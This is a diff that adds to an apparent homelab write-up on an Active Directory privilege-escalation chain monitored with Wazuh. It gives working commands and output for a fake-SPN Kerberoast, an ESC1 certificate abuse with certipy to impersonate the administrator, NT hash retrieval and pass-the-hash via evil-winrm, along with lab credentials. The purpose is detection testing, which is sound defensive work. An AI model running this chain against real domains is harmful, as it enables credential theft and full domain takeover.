@@ -99,5 +99,90 @@ the event got captured , lets view the details :
 
 as we can see the Targeted user is Orange , the and the User who performed action was John Willium , the ip is 192.168.29.244 which is my attacker machine 
 
+5. now we gotta abuse the Generic all on the user Orange and Perform a Asrep-rosting attack
 
+lets set a fake spn:
+```
+bloodyAD --host 192.168.29.244 -d xyz.com -u 'John willium' -p 'j0hn' \                                                                            
+  set object 'CN=Orange,CN=Users,DC=xyz,DC=com' servicePrincipalName -v 'fake/orange.xyz.com'
 
+[+] CN=Orange,CN=Users,DC=xyz,DC=com's servicePrincipalName has been updated
+```
+
+now lets request the spn so we can crack it:
+
+```
+GetUserSPNs.py xyz.com/'John willium':'j0hn' -dc-ip 192.168.29.244 -request -outputfile orange_hash.txt                                            ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
+/home/sawsage/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+ServicePrincipalName  Name    MemberOf                              PasswordLastSet             LastLogon  Delegation
+--------------------  ------  ------------------------------------  --------------------------  ---------  ----------
+fake/orange.xyz.com   Orange  CN=Pentesters,CN=Users,DC=xyz,DC=com  2026-08-01 22:34:34.722759  <never>
+```
+
+<img width="2536" height="1351" alt="image" src="https://github.com/user-attachments/assets/b0347120-2033-43aa-ac40-a9a850c8c471" />
+
+we can see the event was captured , now lets view more details 
+
+<img width="1236" height="1425" alt="image" src="https://github.com/user-attachments/assets/0b533bd0-3908-4890-9427-cb3edcb1358e" />
+
+we can see the request is from the attacker ip : 192.168.29.244 and other detials are present as well
+
+after cracking the ticket offline the Attacker obtains `Orange:secret2!` now the attacker has access to a User who is in the RemoteManagementUsers meaning he can access the machine Remotly via Winrm , now the next step which the attacker takes is Priv-Esc , the Target is vaulnerabel to ESC1 attack which lets a Low privileged user (Like:Orange) ask for a certificate of high privieged USer like (administrator)  , now lets perform this attack and see if the Wazuh captures it or not
+
+```
+certipy-ad req -u 'Orange@xyz.com' -p 'secret2!' \                                                                                                 ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
+  -target 192.168.29.244 \
+  -ca 'DC01-CA' \
+  -template 'Workstation-Enrollment-Prod' \
+  -upn 'administrator@xyz.com'
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 31
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@xyz.com'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+the certificate is captured , now lets ask the dc for the hash/TGT with the cert we acquired :
+
+```
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.29.244                                                                                       ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@xyz.com'
+[*] Using principal: 'administrator@xyz.com'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@xyz.com': aad3b435b51404eeaad3b435b51404ee:0aa71e2167b6136dd8e4b17ed9fd8f91
+```
+
+we have Secuessfully obtained the ntlm hash of the administrator now lets perform the Pass_The_hash attack so we can access the desctop of administrator:
+
+```
+ evil-winrm -i xyz.com -u 'Administrator' -H '0aa71e2167b6136dd8e4b17ed9fd8f91'                                                                     ΓöÇΓöÇ(Wed,Aug05)ΓöÇΓöÿ
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+xyz\administrator
+
+as we can see we now have access to the Administrator one of the most high privileged user 
+```
